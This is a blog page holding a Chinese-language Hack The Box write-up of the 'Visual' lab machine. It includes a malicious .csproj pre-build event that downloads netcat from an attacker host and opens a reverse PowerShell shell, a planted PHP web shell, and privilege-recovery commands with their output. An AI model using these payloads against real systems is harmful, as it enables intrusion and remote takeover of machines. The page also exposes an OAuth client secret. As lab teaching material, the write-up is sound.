@@ -1,0 +1,368 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HTB之Visual靶机篇 | Microfan&#39;s blog</title>
+<link rel="shortcut icon" href="https://m1crofan.github.io/favicon.ico?v=1711550373515">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://m1crofan.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="HTB之Visual靶机篇 | Microfan&#39;s blog - Atom Feed" href="https://m1crofan.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="0x00 HTB
+使用nmap扫描目标ip
+nmap -p-  --min-rate=1000 10.10.11.234
+
+可以看到，开放了80端口
+给定的ip有一个Web站点，该站点有个功能点是能够在线编译.NET或C#的网站。
+存在的漏..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://m1crofan.github.io">
+  <img class="avatar" src="https://m1crofan.github.io/images/avatar.png?v=1711550373515" alt="">
+  </a>
+  <h1 class="site-title">
+    Microfan&#39;s blog
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              HTB之Visual靶机篇
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-27
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="0x00-htb"><strong>0x00 HTB</strong></h3>
+<p>使用nmap扫描目标ip</p>
+<pre><code class="language-shell">nmap -p-  --min-rate=1000 10.10.11.234
+</code></pre>
+<p>可以看到，开放了80端口</p>
+<p>给定的ip有一个Web站点，该站点有个功能点是能够在线编译<code>.NET</code>或<code>C#</code>的网站。</p>
+<p>存在的漏洞是：.NET预编译过程可以执行预编译事件；我们可以通过定义预编译事件执行系统命令，反弹shell。.NET定义预编译事件的文件名为<code>.csproj</code>。如下所示：</p>
+<pre><code class="language-xml">&lt;Project Sdk=&quot;Microsoft.NET.Sdk.Web&quot;&gt;
+
+  &lt;PropertyGroup&gt;
+    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
+    &lt;LangVersion&gt;preview&lt;/LangVersion&gt;
+	&lt;PreBuildEvent&gt;powershell.exe -c &quot;curl http://10.10.16.3:8081/nc64.exe -o C:/Windows/Tasks/nc.exe; C:/Windows/Tasks/nc.exe 10.10.16.3 9001 -e powershell&quot;&lt;/PreBuildEvent&gt;
+  &lt;/PropertyGroup&gt;
+
+  &lt;ItemGroup&gt;
+    &lt;PackageReference Include=&quot;Microsoft.OpenApi&quot; Version=&quot;1.3.0-preview&quot; /&gt;
+    &lt;PackageReference Include=&quot;Swashbuckle.AspNetCore&quot; Version=&quot;6.2.1&quot; /&gt;
+  &lt;/ItemGroup&gt;
+
+  &lt;ItemGroup&gt;
+    &lt;ProjectReference Include=&quot;..\Sample.DotNet6.Api.Core\Sample.DotNet6.Api.Core.csproj&quot; /&gt;
+  &lt;/ItemGroup&gt;
+
+&lt;/Project&gt;
+</code></pre>
+<p>反弹shell的payload为：</p>
+<pre><code class="language-bash">powershell.exe -c &quot;curl http://10.10.16.2:8081/nc64.exe -o C:/Windows/Tasks/nc.exe; C:/Windows/Tasks/nc.exe 10.10.16.2 9001 -e powershell&quot;
+</code></pre>
+<ul>
+<li>使用powershell执行<code>&quot;&quot;</code>中的命令；下载目标8081端口的netcat并保存到<code>C:/Windows/Tasks/nc.exe</code>这个目录下。</li>
+<li>执行Netcat建立一个反向连接，反向连接成功后将输入和输出重定向到Powershell进程。</li>
+</ul>
+<h3 id="0x01-后门攻击"><strong>0x01 后门攻击</strong></h3>
+<p>clone一个<code>.NET</code>项目</p>
+<pre><code class="language-shell">git clone https://github.com/hgmauri/sample-dotnet6
+</code></pre>
+<p>修改其中的<code>.csproj</code>文件如0x00中所提到的。</p>
+<p>配置apache2来托管我们的git存储库。需要的模块如下：</p>
+<pre><code class="language-shell">sudo a2enmod cgi
+sudo a2enmod alias
+sudo a2enmod env
+sudo service apache2 resart
+</code></pre>
+<p>之后创建目录、修改目录所有者为Apache</p>
+<pre><code class="language-shell">sudo mkdir /var/www/html/git-repos
+sudo chown -R www-data:www-data /var/www/html/git-repos
+</code></pre>
+<p>添加如下内容到Apache2的配置文件/etc/apache2/apache2.conf</p>
+<pre><code class="language-shell">ScriptAlias /git/ /usr/lib/git-core/git-http-backend/ 
+SetEnv GIT_PROJECT_ROOT /var/www/html/git-repos 
+SetEnv GIT_HTTP_EXPORT_ALL 
+Options +ExecCGI AddHandler cgi-script .cgi 
+DirectoryIndex gitweb.cgi 
+&lt;Directory /usr/lib/git-core&gt; 
+	Require all granted 
+&lt;/Directory&gt;
+</code></pre>
+<p>这段内容主要在做一些目录映射，以及一些git相关配置的事情。</p>
+<p>初始化Git仓库</p>
+<pre><code class="language-shell">git init
+git add .
+git commit -m &quot;2024-3-27&quot;
+</code></pre>
+<p>使用python的<code>http.server</code>模块提供http服务在8081端口；使用nc监听9001端口</p>
+<pre><code class="language-shell">python3 -m http.server 8080 
+rlwrap nc -lvnp 9001
+</code></pre>
+<blockquote>
+<p><code>rlwrap</code>是一个用于增强命令行输入的工具，作用是提供命令历史记录，命令补全等功能。</p>
+<p>-lvnp:告诉NetCat监听9001端口（p）、并且以监听模式（-l）、启用日志记录（-v）、不进行DNS解析（-n）</p>
+</blockquote>
+<h3 id="0x02-横向移动"><strong>0x02 横向移动</strong></h3>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240327150330762.png" alt="image-20240327150330762" loading="lazy"></figure>
+<p>成功反弹shell之后，开始横向移动。</p>
+<p>往web中写入shell</p>
+<pre><code class="language-shell">Set-Content -path &quot;C:\xampp\htdocs\cmd.php&quot; -Value '&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;'
+</code></pre>
+<p>再开一个netcat监听</p>
+<pre><code class="language-shell">rlwrap nc -lvnp 9001
+</code></pre>
+<p>在Web中访问这个URL</p>
+<pre><code class="language-shell">10.10.11.234/cmd.php?cmd=whoami
+</code></pre>
+<p>得到一个新账户</p>
+<pre><code class="language-html">nt authority\local service 
+</code></pre>
+<p>修改nc64.exe的权限</p>
+<pre><code class="language-shell">icacls.exe C:\windows\Tasks\nc.exe /grant Everyone:F
+</code></pre>
+<blockquote>
+<ul>
+<li><code>icacls.exe</code>是Windows上用来修改文件ACL（访问控制）的命令行工具。它允许用户控制对文件和目录的权限设置</li>
+<li><code>/grant Everyone:F</code> 授予所有组完全控制权限。</li>
+</ul>
+</blockquote>
+<p>访问下面这个URL反弹shell</p>
+<pre><code class="language-shell">/cmd.php?cmd=C:\windows\tasks\nc.exe%20-e%20powershell%2010.10.14.44%209001
+</code></pre>
+<h3 id="0x03-提权">0x03 提权</h3>
+<pre><code class="language-shell">PS C:\windows\temp&gt; whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION                              
+----------------------                              
+                                                    
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+</code></pre>
+<p>使用FullPowers恢复权限</p>
+<pre><code class="language-shell">PS C:\windows\temp&gt; wget 10.10.16.3:8081/FullPowers.exe -O c:\windows\temp\full1.exe
+wget 10.10.16.3:8081/FullPowers.exe -O c:\windows\temp\full1.exe
+PS C:\windows\temp&gt; .\full1.exe
+.\full1.exe
+[+] Started dummy thread with id 2224
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.4851]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+</code></pre>
+<p>到此，成功的恢复了所有的权限，特别是恢复了SelmpersonatePrivilege。可以使用GodPotato进行提权。</p>
+<h3 id="0x04-总结">0x04 总结</h3>
+<p>金土豆提权我老是成功不了不知道为什么~ 可能缘分未到，哈哈哈哈 后面有机会再做。</p>
+<p>这是我第一次打HTB靶机，断断续续经历了四天。利用Web站点的<code>.NET</code>预编译植入命令，反弹shell。然后横向移动、恢复权限、提权。这整一个流程是我认知里的红队。</p>
+<p>搞渗透真的是太酷啦！！！😎</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-htb"><strong>0x00 HTB</strong></a></li>
+<li><a href="#0x01-%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB"><strong>0x01 后门攻击</strong></a></li>
+<li><a href="#0x02-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><strong>0x02 横向移动</strong></a></li>
+<li><a href="#0x03-%E6%8F%90%E6%9D%83">0x03 提权</a></li>
+<li><a href="#0x04-%E6%80%BB%E7%BB%93">0x04 总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://m1crofan.github.io/2OHQ0OA1V/">
+              <h3 class="post-title">
+                xss绕waf的小trick
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+<script>
+    // md5.min.js
+    !function(n){
+        "use strict";
+        function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}
+        function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))<<(f=o)|c>>>32-f,r);var c,f}
+        function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}
+        function v(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}
+        function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}
+        function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}
+        function i(n,t){var r,e,o,u,c;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;var f=1732584193,i=-271733879,a=-1732584194,h=271733878;for(r=0;r<n.length;r+=16)f=l(e=f,o=i,u=a,c=h,n[r],7,-680876936),h=l(h,f,i,a,n[r+1],12,-389564586),a=l(a,h,f,i,n[r+2],17,606105819),i=l(i,a,h,f,n[r+3],22,-1044525330),f=l(f,i,a,h,n[r+4],7,-176418897),h=l(h,f,i,a,n[r+5],12,1200080426),a=l(a,h,f,i,n[r+6],17,-1473231341),i=l(i,a,h,f,n[r+7],22,-45705983),f=l(f,i,a,h,n[r+8],7,1770035416),h=l(h,f,i,a,n[r+9],12,-1958414417),a=l(a,h,f,i,n[r+10],17,-42063),i=l(i,a,h,f,n[r+11],22,-1990404162),f=l(f,i,a,h,n[r+12],7,1804603682),h=l(h,f,i,a,n[r+13],12,-40341101),a=l(a,h,f,i,n[r+14],17,-1502002290),f=v(f,i=l(i,a,h,f,n[r+15],22,1236535329),a,h,n[r+1],5,-165796510),h=v(h,f,i,a,n[r+6],9,-1069501632),a=v(a,h,f,i,n[r+11],14,643717713),i=v(i,a,h,f,n[r],20,-373897302),f=v(f,i,a,h,n[r+5],5,-701558691),h=v(h,f,i,a,n[r+10],9,38016083),a=v(a,h,f,i,n[r+15],14,-660478335),i=v(i,a,h,f,n[r+4],20,-405537848),f=v(f,i,a,h,n[r+9],5,568446438),h=v(h,f,i,a,n[r+14],9,-1019803690),a=v(a,h,f,i,n[r+3],14,-187363961),i=v(i,a,h,f,n[r+8],20,1163531501),f=v(f,i,a,h,n[r+13],5,-1444681467),h=v(h,f,i,a,n[r+2],9,-51403784),a=v(a,h,f,i,n[r+7],14,1735328473),f=g(f,i=v(i,a,h,f,n[r+12],20,-1926607734),a,h,n[r+5],4,-378558),h=g(h,f,i,a,n[r+8],11,-2022574463),a=g(a,h,f,i,n[r+11],16,1839030562),i=g(i,a,h,f,n[r+14],23,-35309556),f=g(f,i,a,h,n[r+1],4,-1530992060),h=g(h,f,i,a,n[r+4],11,1272893353),a=g(a,h,f,i,n[r+7],16,-155497632),i=g(i,a,h,f,n[r+10],23,-1094730640),f=g(f,i,a,h,n[r+13],4,681279174),h=g(h,f,i,a,n[r],11,-358537222),a=g(a,h,f,i,n[r+3],16,-722521979),i=g(i,a,h,f,n[r+6],23,76029189),f=g(f,i,a,h,n[r+9],4,-640364487),h=g(h,f,i,a,n[r+12],11,-421815835),a=g(a,h,f,i,n[r+15],16,530742520),f=m(f,i=g(i,a,h,f,n[r+2],23,-995338651),a,h,n[r],6,-198630844),h=m(h,f,i,a,n[r+7],10,1126891415),a=m(a,h,f,i,n[r+14],15,-1416354905),i=m(i,a,h,f,n[r+5],21,-57434055),f=m(f,i,a,h,n[r+12],6,1700485571),h=m(h,f,i,a,n[r+3],10,-1894986606),a=m(a,h,f,i,n[r+10],15,-1051523),i=m(i,a,h,f,n[r+1],21,-2054922799),f=m(f,i,a,h,n[r+8],6,1873313359),h=m(h,f,i,a,n[r+15],10,-30611744),a=m(a,h,f,i,n[r+6],15,-1560198380),i=m(i,a,h,f,n[r+13],21,1309151649),f=m(f,i,a,h,n[r+4],6,-145523070),h=m(h,f,i,a,n[r+11],10,-1120210379),a=m(a,h,f,i,n[r+2],15,718787259),i=m(i,a,h,f,n[r+9],21,-343485551),f=d(f,e),i=d(i,o),a=d(a,u),h=d(h,c);return[f,i,a,h]}
+        function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}
+        function h(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}
+        function e(n){var t,r,e="0123456789abcdef",o="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),o+=e.charAt(t>>>4&15)+e.charAt(15&t);return o}
+        function r(n){return unescape(encodeURIComponent(n))}
+        function o(n){return a(i(h(t=r(n)),8*t.length));var t}
+        function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16<o.length&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}
+        function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}
+        "function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t;
+    }(this);
+</script>
+
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60d1e67a466b7af7add7',
+    clientSecret: '7e64b888991fafb9802cd7551bba4ac683fd3273',
+    repo: 'm1crofan.github.io',
+    owner: 'm1crofan',
+    admin: ['m1crofan'],
+    id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false       // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  钢琴 住了几个妖~嘿嘿！ 邮箱 煮了几个馍~ 嘚嘚！
+  <a class="rss" href="https://m1crofan.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
